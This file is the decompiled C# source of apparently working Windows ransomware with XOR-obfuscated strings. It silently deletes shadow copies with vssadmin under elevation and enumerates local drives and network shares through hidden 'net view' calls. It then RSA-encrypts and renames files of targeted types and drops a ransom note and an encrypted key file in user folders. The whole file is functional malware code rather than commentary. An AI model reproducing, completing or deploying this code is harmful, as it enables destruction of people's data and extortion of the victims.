using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using omrap.Properties;

namespace omrap;

public class Form1 : Form
{
	private byte byte_0 = 114;

	private int int_0 = 245;

	private int int_1 = 3;

	private string string_0 = "";

	private string string_1;

	private string string_2 = "";

	private string string_3 = "";

	private string string_4 = "";

	private string string_5 = "";

	private string string_6 = "";

	private List<string> list_0 = new List<string>();

	private List<string> list_1 = new List<string>();

	private List<string> list_2 = new List<string>();

	private string string_7 = "";

	private string string_8 = "";

	private byte[] byte_1;

	private IContainer icontainer_0 = null;

	public Form1()
	{
		InitializeComponent();
		Array.Resize(ref byte_1, 9);
		if (!method_3())
		{
			method_0();
		}
	}

	private void method_0()
	{
		method_5();
		method_17();
		method_11();
		method_15();
	}

	private string method_1(string string_9)
	{
		return string_9[..string_9.IndexOf('.')];
	}

	private string method_2(string string_9)
	{
		int num = string_9.IndexOf('.');
		return string_9.Substring(num + 1, string_9.Length - num - 1);
	}

	private bool method_3()
	{
		bool result = false;
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
		if (processesByName.Length > 1)
		{
			result = true;
		}
		return result;
	}

	private void method_4(int int_2)
	{
		int num = 0;
		for (int i = 0; i < int_2; i++)
		{
			num++;
		}
		num = num * int_2 + num + 20 + 1;
		Math.Log(Convert.ToDouble(int_2 + num * num));
		num = num * int_2 + num + 20 + 1;
	}

	private void method_5()
	{
		byte_1 = new byte[6] { 93, 18, 1, 3, 7, 23 };
		byte[] byte_ = new byte[7] { 25, 23, 11, 92, 23, 23, 23 };
		byte[] byte_2 = new byte[36]
		{
			83, 95, 95, 95, 95, 184, 178, 184, 82, 176,
			188, 163, 163, 160, 178, 191, 188, 176, 186, 160,
			174, 82, 166, 178, 187, 185, 169, 95, 95, 95,
			95, 83, 92, 24, 2, 21
		};
		byte[] byte_3 = new byte[415]
		{
			78, 32, 33, 51, 57, 23, 11, 36, 19, 30,
			7, 23, 76, 78, 63, 29, 22, 7, 30, 7,
			1, 76, 89, 20, 52, 43, 27, 61, 75, 49,
			58, 75, 27, 40, 5, 5, 8, 30, 1, 35,
			65, 42, 89, 3, 40, 69, 39, 11, 10, 64,
			75, 66, 61, 26, 40, 67, 37, 4, 62, 6,
			68, 17, 31, 54, 22, 71, 29, 32, 1, 62,
			29, 58, 62, 28, 29, 53, 5, 1, 67, 49,
			37, 52, 63, 61, 53, 52, 24, 6, 16, 19,
			32, 61, 33, 25, 38, 21, 65, 37, 89, 69,
			64, 93, 38, 24, 8, 58, 25, 7, 34, 2,
			64, 37, 93, 32, 49, 69, 52, 48, 49, 70,
			56, 2, 21, 21, 7, 49, 27, 70, 10, 70,
			11, 23, 70, 58, 55, 5, 32, 25, 35, 69,
			71, 6, 58, 26, 27, 21, 66, 74, 26, 32,
			57, 31, 67, 19, 69, 5, 30, 5, 43, 30,
			74, 8, 62, 51, 8, 63, 74, 51, 5, 38,
			34, 62, 26, 69, 69, 66, 63, 61, 8, 34,
			3, 52, 67, 20, 56, 63, 57, 40, 49, 51,
			6, 22, 39, 21, 59, 57, 22, 43, 60, 51,
			25, 0, 34, 67, 74, 1, 32, 16, 1, 26,
			25, 53, 60, 24, 5, 24, 63, 26, 63, 62,
			60, 16, 57, 38, 19, 43, 20, 29, 65, 3,
			59, 33, 70, 4, 6, 36, 39, 35, 6, 17,
			5, 89, 21, 75, 11, 1, 65, 40, 52, 40,
			23, 6, 57, 55, 30, 66, 40, 63, 56, 55,
			2, 70, 42, 69, 16, 70, 58, 57, 75, 4,
			3, 39, 29, 26, 34, 48, 43, 20, 48, 1,
			8, 42, 43, 68, 27, 29, 28, 71, 31, 71,
			6, 33, 33, 20, 26, 56, 57, 68, 61, 42,
			64, 58, 34, 19, 39, 68, 32, 54, 17, 19,
			24, 38, 23, 55, 17, 31, 25, 75, 27, 6,
			75, 10, 69, 65, 22, 0, 56, 30, 23, 40,
			67, 53, 89, 6, 36, 21, 62, 68, 22, 7,
			62, 42, 93, 7, 61, 37, 34, 36, 11, 27,
			66, 0, 26, 11, 4, 43, 31, 32, 0, 53,
			60, 17, 59, 35, 79, 79, 78, 93, 63, 29,
			22, 7, 30, 7, 1, 76, 78, 55, 10, 2,
			29, 28, 23, 28, 6, 76, 51, 35, 51, 48,
			78, 93, 55, 10, 2, 29, 28, 23, 28, 6,
			76, 78, 93, 32, 33, 51, 57, 23, 11, 36,
			19, 30, 7, 23, 76
		};
		if (Environment.OSVersion.Version.Major > 5)
		{
			method_19();
		}
		string_5 = method_20(byte_3, byte_0);
		method_20(byte_2, byte_0);
		string_7 = method_20(byte_2, byte_0);
		string_2 = method_20(byte_, byte_0);
		string_4 = method_2(string_2);
		string_3 = method_1(string_2);
		for (int i = 0; i < byte_1.Length; i++)
		{
			byte_1[i] = Convert.ToByte(Convert.ToInt32(byte_1[i]) - 1);
		}
		string_1 = method_20(byte_1, byte_0);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf("\\system"));
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		list_0.Add(folderPath.ToLower());
		list_0.Add(folderPath2.ToLower());
		list_0.Add(method_20(new byte[8] { 32, 55, 49, 43, 49, 62, 55, 32 }, byte_0));
		list_0.Add(method_20(new byte[12]
		{
			86, 32, 55, 49, 43, 49, 62, 55, 92, 48,
			59, 60
		}, byte_0));
		list_0.Add(method_20(new byte[25]
		{
			33, 11, 1, 6, 23, 31, 82, 36, 29, 30,
			7, 31, 23, 82, 59, 28, 20, 29, 0, 31,
			19, 6, 27, 29, 28
		}, byte_0));
		method_7();
		method_16();
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		string_0 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		string_6 = method_6(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
	}

	private string method_6(string string_9)
	{
		string text = "";
		byte[] array = new byte[string_9.Length];
		byte[] array2 = new byte[int_0];
		byte[] array3 = new byte[int_0 + 11];
		double num = Math.Ceiling((double)string_9.Length / (double)int_0);
		if ((double)string_9.Length < num * (double)int_0)
		{
			int length = string_9.Length;
			for (int i = 0; (double)i < num * (double)int_0 - (double)length; i++)
			{
				string_9 += " ";
			}
		}
		array = Encoding.Default.GetBytes(string_9);
		Array.Reverse((Array)array);
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(string_5);
			for (int j = 0; (double)j < num; j++)
			{
				Array.Copy(array, j * int_0, array2, 0, int_0);
				array3 = rSACryptoServiceProvider.Encrypt(array2, fOAEP: false);
				text += Encoding.Default.GetString(array3);
			}
		}
		catch
		{
		}
		return text;
	}

	private void method_7()
	{
		list_1.Add(method_20(new byte[3] { 92, 17, 22 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 30, 22, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 31, 22, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 31, 19, 10 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 22, 16, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 23, 2, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 67, 17, 22 }, byte_0));
		list_1.Add(method_20(new byte[3] { 92, 31, 22 }, byte_0));
		list_1.Add(method_20(new byte[3] { 92, 22, 16 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 2, 22, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 2, 2, 6 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 10, 30, 1 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 22, 29, 17 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 19, 0, 24 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 6, 19, 0 }, byte_0));
		list_1.Add(method_20(new byte[3] { 92, 69, 8 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 0, 19, 0 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 8, 27, 2 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 6, 27, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 24, 2, 21 }, byte_0));
		list_1.Add(method_20(new byte[3] { 92, 19, 27 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 16, 31, 2 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 2, 28, 21 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 17, 22, 0 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 2, 1, 22 }, byte_0));
		list_1.Add(method_20(new byte[5] { 92, 24, 2, 23, 21 }, byte_0));
		list_1.Add(method_20(new byte[5] { 92, 22, 29, 17, 10 }, byte_0));
		list_1.Add(method_20(new byte[5] { 92, 10, 30, 1, 10 }, byte_0));
		list_1.Add(method_20(new byte[5] { 92, 2, 2, 6, 10 }, byte_0));
		list_1.Add(method_20(new byte[6] { 92, 19, 17, 17, 22, 16 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 31, 22, 16 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 0, 6, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 29, 22, 6 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 29, 22, 1 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 29, 22, 16 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 29, 22, 21 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 17, 0, 64 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 28, 23, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 28, 0, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 29, 0, 20 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 19, 0, 5 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 1, 0, 64 }, byte_0));
		list_1.Add(method_20(new byte[4] { 92, 1, 0, 20 }, byte_0));
	}

	private int method_8(string string_9)
	{
		int result = 0;
		try
		{
			string[] files = Directory.GetFiles(string_9, string_3 + "*." + string_4);
			result = files.Length;
		}
		catch
		{
		}
		return result;
	}

	private void method_9(string string_9)
	{
		string currentDirectory = Environment.CurrentDirectory;
		if (!(string_9 != currentDirectory))
		{
			return;
		}
		try
		{
			if (!File.Exists(string_9 + "\\" + string_7))
			{
				((Image)Resources.note4).Save(string_9 + "\\" + string_7);
			}
		}
		catch
		{
		}
	}

	private void method_10(string string_9, string string_10)
	{
		string text = string_2.Substring(0, string_2.Length - 4);
		if (!File.Exists(string_9 + "\\" + string_2))
		{
			try
			{
				File.WriteAllText(string_9 + "\\" + string_2, string_10);
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			File.WriteAllText(string_9 + "\\" + text + method_8(string_9) + "." + string_4, string_10);
		}
		catch
		{
		}
	}

	private void method_11()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Network)
				{
					method_12(driveInfo.RootDirectory);
				}
			}
		}
		catch
		{
		}
	}

	private void method_12(DirectoryInfo directoryInfo_0)
	{
		try
		{
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo directoryInfo_ in array)
			{
				method_13(directoryInfo_);
				method_12(directoryInfo_);
			}
		}
		catch
		{
		}
	}

	private void method_13(DirectoryInfo directoryInfo_0)
	{
		try
		{
			string[] files = Directory.GetFiles(directoryInfo_0.FullName, "*.*");
			string[] array = files;
			foreach (string text in array)
			{
				foreach (string item in list_1)
				{
					if (text.ToLower().IndexOf(item) > -1 && text.ToLower().IndexOf(string_1) == -1)
					{
						string string_ = text;
						if (text.IndexOf(string_7) == -1)
						{
							method_18(string_);
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	private void method_14(DirectoryInfo directoryInfo_0)
	{
		method_9(directoryInfo_0.FullName);
		method_10(directoryInfo_0.FullName, string_6);
	}

	private void method_15()
	{
		for (int i = 0; i < list_2.Count; i++)
		{
			DirectoryInfo directoryInfo_ = new DirectoryInfo(list_2[i].ToString());
			method_12(directoryInfo_);
		}
	}

	private void method_16()
	{
		List<string> list = new List<string>();
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			int startIndex = 0;
			int num = 0;
			while (true)
			{
				startIndex = text.IndexOf('\\', startIndex);
				if (startIndex != -1)
				{
					num = text.IndexOf(' ', startIndex);
					list.Add(text.Substring(startIndex, num - startIndex));
					startIndex = num;
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		for (int i = 0; i < list.Count; i++)
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/C net view " + list[i];
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			try
			{
				process2.Start();
				string s = process2.StandardOutput.ReadToEnd();
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
				string @string = Encoding.GetEncoding("CP866").GetString(bytes);
				string[] array = @string.Split('\r', '\n');
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].IndexOf("Диск") > -1)
					{
						list_2.Add(list[i] + "\\" + array[j].Substring(0, array[j].IndexOf("Диск")));
					}
				}
			}
			catch
			{
			}
		}
	}

	private void method_17()
	{
		List<string> list = new List<string>();
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		for (int i = 0; i < list.Count; i++)
		{
			method_10(list[i], string_6);
			method_9(list[i]);
		}
	}

	private void method_18(string string_9)
	{
		byte[] array = new byte[int_0];
		method_4(2);
		try
		{
			byte[] array2 = File.ReadAllBytes(string_9);
			if (array2.Length / (int_1 + 5) >= int_0)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
				rSACryptoServiceProvider.FromXmlString(string_0);
				byte[] array3 = new byte[array2.Length + int_1 * 11];
				byte[] array4 = new byte[array2.Length - int_1 * int_0];
				for (int i = 0; i < int_1; i++)
				{
					Array.Copy(array2, int_0 * i, array, 0, int_0);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
					Array.Copy(array5, 0, array3, i * (int_0 + 11), array5.Length);
				}
				Array.Copy(array2, int_1 * int_0, array4, 0, array4.Length);
				Array.Copy(array4, 0, array3, int_1 * (int_0 + 11), array4.Length);
				try
				{
					File.WriteAllBytes(string_9, array3);
					File.Move(string_9, string_9 + string_1);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private void method_19()
	{
		byte[] byte_ = new byte[12]
		{
			4, 1, 1, 19, 22, 31, 27, 28, 92, 23,
			10, 23
		};
		byte[] byte_2 = new byte[26]
		{
			54, 23, 30, 23, 6, 23, 82, 33, 26, 19,
			22, 29, 5, 1, 82, 93, 51, 30, 30, 82,
			93, 35, 7, 27, 23, 6
		};
		Process process = new Process();
		process.StartInfo.FileName = method_20(byte_, byte_0);
		process.StartInfo.Arguments = method_20(byte_2, byte_0);
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.Verb = "runas";
		try
		{
			process.Start();
		}
		catch
		{
		}
	}

	private string method_20(byte[] byte_2, int int_2)
	{
		byte[] array = new byte[byte_2.Length];
		for (int i = 0; i < byte_2.Length; i++)
		{
			array[i] = (byte)(byte_2[i] ^ int_2);
		}
		return Encoding.Default.GetString(array);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		method_4(3);
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
